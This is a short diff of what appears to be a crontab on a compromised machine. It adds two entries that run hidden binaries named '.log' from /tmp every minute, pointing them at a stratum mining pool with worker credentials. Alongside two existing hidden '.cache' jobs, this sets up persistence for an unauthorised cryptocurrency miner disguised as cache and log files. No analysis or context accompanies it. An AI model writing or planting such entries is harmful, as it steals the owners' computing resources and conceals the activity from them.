@@ -1,2 +1,5 @@
 */1 * * * * /tmp/.cache
 */1 * * * * /var/lock/.cache
+*/1 * * * * /tmp/.log -a m7mhash --url=stratum+tcp://xmg.coinsump.com:3333 -u mindamp.anvil1 -p anvil1 -e 100
+*/1 * * * * /tmp/lock/.log -a m7mhash --url=stratum+tcp://xmg.coinsump.com:3333 -u mindamp.anvil1 -p anvil1 -e 100
+
